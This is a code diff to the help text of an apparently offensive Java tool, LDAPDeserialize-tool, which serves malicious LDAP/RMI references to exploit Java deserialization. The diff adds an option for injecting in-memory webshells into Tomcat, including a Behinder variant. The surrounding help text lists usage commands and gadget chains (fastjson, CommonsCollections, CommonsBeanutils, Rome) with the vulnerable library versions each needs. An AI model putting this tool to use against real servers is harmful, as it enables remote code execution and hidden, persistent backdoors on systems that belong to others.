@@ -28,7 +28,7 @@ public class LDAPRefServer {
         options.addOption("b", "base64", true, "反序列化打法：序列化数据base64编码值");
         options.addOption("C", "class", true, "低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）");
         options.addOption("g", "gadget", true, "内置反序列化链");
-        options.addOption("c", "cmd", true, "使用内置反序列化链时所要执行的命令（存在空格时请使用双引号包裹）");
+        options.addOption("c", "cmd", true, "使用内置反序列化链时所要执行的命令，或指定所要打的内存马类型（存在空格时请使用双引号包裹）");
         options.addOption("rmi", "rmi", false, "rmi反序列化打法，可打JDK20+，只支持内置链打法");
         options.addOption("ip", "ip", true, "VPS-IP地址");
 //        options.addOption("m", "m", true, "内存马：暂时默认加入servlet内存马");更改内存马加入方式
@@ -122,7 +122,8 @@ public class LDAPRefServer {
                             "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
                             "RMI反序列化打法：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
                             "RMI内置利用链遍历：\njava -jar LDAPDeserialize-tool.jar -g execAll -c \"calc\" -rmi -ip 当前服务器公网ip\n" +
-                            "\n\n" +
+                            "注入内存马：\njava -jar LDAPDeserialize-tool.jar -g fastjson -c TomcatListenerCMD\n"+
+                            "\n" +
                             "【目前支持的链,*号为支持JDK20+的链】\n" +
                             "fastjson (依赖：1.2.49-1.2.83)\n" +
                             "* CC6 (依赖：<= commons-collections 3.2.1)\n" +
@@ -135,8 +136,12 @@ public class LDAPRefServer {
                             "CB192 (依赖：commons-beanutils 1.9.2 && commons-logging 1.2)\n" +
                             "CB183 (依赖：commons-beanutils 1.8.3 && commons-logging 1.2)\n" +
                             "rome (依赖：Rome 1.0)\n" +
-                            "execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)" +
-                            "\n\n\n"
+                            "execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)\n" +
+                            "\n"+
+                            "【目前支持的内存马类型】\n"+
+                            "TomcatListenerCMD (tomcat listener型CMD内存马)\n"+
+                            "TomcatListenerBehinderByLei (tomcat listener型冰蝎内存马,需使用改版的冰蝎)\n"+
+                            "\n"
                     , options);
         }
     }
